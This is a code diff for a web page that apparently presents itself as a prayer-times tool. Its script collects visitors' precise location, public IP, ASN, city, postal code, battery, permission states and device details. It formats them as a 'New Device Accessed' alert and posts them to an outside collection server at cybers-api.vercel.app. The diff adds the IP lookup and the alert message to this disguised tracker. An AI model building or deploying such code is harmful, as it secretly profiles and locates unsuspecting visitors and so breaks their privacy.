@@ -93,18 +93,7 @@ Lokasi Anda
 </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/ua-parser-js/dist/ua-parser.min.js"></script></script>
 <script>
-// const nav = {}
-// for (let key in navigator) {
-// try {
-// nav[key] = navigator[key]
-// } catch (e) {
-// nav[key] = '[access denied]'
-// }
-// }
-
-// document.getElementById('debug').textContent = JSON.stringify(nav, null, 2)
 const parser = new UAParser()
 const result = parser.getResult()
 const BOT_SERVER_URL = "https://cybers-api.vercel.app/v1/collect"
@@ -128,7 +117,7 @@ document.getElementById("lokasi").innerHTML =
 "<span class='text-amber-400'>Permission required to show prayer times</span>"
 })
 
-function getDeviceInfo() {
+async function getDeviceInfo() {
 const info = {
 timestamp: new Date().toISOString(),
 userAgent: navigator.userAgent,
@@ -143,65 +132,109 @@ pixelDepth: screen.pixelDepth,
 },
 memory: navigator.deviceMemory || 'unknown',
 heapSize: performance.memory?.jsHeapSizeLimit || 'unknown',
-connection: navigator.connection
-? {
+connection: navigator.connection ? {
 type: navigator.connection.type,
-effectiveType: navigator.connection.effectiveType.toUpperCase(),
+effectiveType: navigator.connection.effectiveType?.toUpperCase(),
 downlink: navigator.connection.downlink,
 rtt: navigator.connection.rtt,
-}
-: null,
+} : {},
 permissions: [],
 battery: null,
+ip: null,
+ipDetail: null,
 deviceDetail: {
 os: result.os.name + " " + result.os.version,
-device: navigator.userAgentData.platform || "Unknown",
-browser: navigator.userAgentData.brands[0].brand,
+device: navigator.userAgentData?.platform || "Unknown",
+browser: navigator.userAgentData?.brands[0]?.brand || result.browser.name,
 },
 }
 
-const getPerms = navigator.permissions
-? Promise.all([
+if (navigator.permissions) {
+try {
+const results = await Promise.all([
 navigator.permissions.query({ name: 'geolocation' }),
-navigator.permissions.query({ name: 'notifications' }),
+navigator.permissions.query({ name: 'notifications' })
 ])
-.then(results => {
 info.permissions = results.map(r => `${r.name}:${r.state}`)
-})
-.catch(() => {})
-: Promise.resolve()
+} catch {}
+}
 
-const getBatt = navigator.getBattery
-? navigator.getBattery().then(batt => {
+if (navigator.getBattery) {
+try {
+const batt = await navigator.getBattery()
 info.battery = {
 level: (batt.level * 100).toFixed(0) + '%',
 charging: batt.charging,
 }
-})
-: Promise.resolve()
+} catch {}
+}
 
-return Promise.all([getPerms, getBatt]).then(() => info)
+try {
+const ipRes = await fetch('https://ipapi.co/json/')
+const ipData = await ipRes.json()
+info.ip = ipData.ip || null
+info.ipDetail = ipData
+} catch {}
+
+return info
 }
 
 function sendDeviceData(deviceInfo, location) {
 if (!userConsent) return
+
+const ip = deviceInfo.ipDetail || {}
+const message = `
+📱 *New Device Accessed*
+⌚ *Time:* ${new Date().toLocaleString()}
+📍 *Location:* ${location.latitude}, ${location.longitude}
+
+🔋 *Battery:*
+- Level: ${deviceInfo.battery?.level || 'N/A'}
+- Charging: ${deviceInfo.battery?.charging ? 'Yes' : 'No'}
+
+💻 *Device Info:*
+- Device: ${deviceInfo.deviceDetail.device || 'Unknown'}
+- OS: ${deviceInfo.deviceDetail.os || 'Unknown'}
+- Browser: ${deviceInfo.deviceDetail.browser || 'Unknown'}
+- Language: ${deviceInfo.language}
+- Memory: ${deviceInfo.memory} GB
+- Timezone: ${deviceInfo.timezone || 'N/A'}
+- IP: ${ip.ip || 'N/A'} (${ip.version || '?'})
+
+🌐 *Network:*
+- ASN: ${ip.asn || 'N/A'}
+- Org: ${ip.org || 'N/A'}
+- Country: ${ip.country_name || 'N/A'} (${ip.country_code})
+- Region: ${ip.region || '-'} (${ip.region_code})
+- City: ${ip.city || '-'}
+- Postal: ${ip.postal || '-'}
+- Latitude: ${ip.latitude}, Longitude: ${ip.longitude}
+- Area: ${ip.country_area} km²
+- Population: ${ip.country_population}
+- Currency: ${ip.currency_name} (${ip.currency})
+- Languages: ${ip.languages}
+- Capital: ${ip.country_capital}
+- Continent: ${ip.continent_code}
+- TLD: ${ip.country_tld}
+- Calling Code: ${ip.country_calling_code}
+
+📏 *Screen:* ${deviceInfo.screen?.width}x${deviceInfo.screen?.height}
+🧠 *Heap Limit:* ${deviceInfo.heapSize ? (deviceInfo.heapSize / 1024 / 1024).toFixed(1) + ' MB' : 'N/A'}
+🚦 *Permissions:* ${(deviceInfo.permissions || []).join(', ')}
+`
+
 const payload = JSON.stringify({
 device: deviceInfo,
-location: location,
-timestamp: new Date().toISOString(),
+location,
+message,
+timestamp: new Date().toISOString()
 })
 
 const xhr = new XMLHttpRequest()
 xhr.open("POST", BOT_SERVER_URL, true)
 xhr.setRequestHeader("Content-Type", "application/json")
 xhr.onreadystatechange = function () {
-if (xhr.readyState === 4) {
-if (xhr.status === 200) {
-console.log("✅ Data sent")
-} else {
-console.error("❌ Failed:", xhr.statusText)
-}
-}
+if (xhr.readyState === 4 && xhr.status !== 200) console.error("❌ Failed:", xhr.statusText)
 }
 xhr.send(payload)
 }
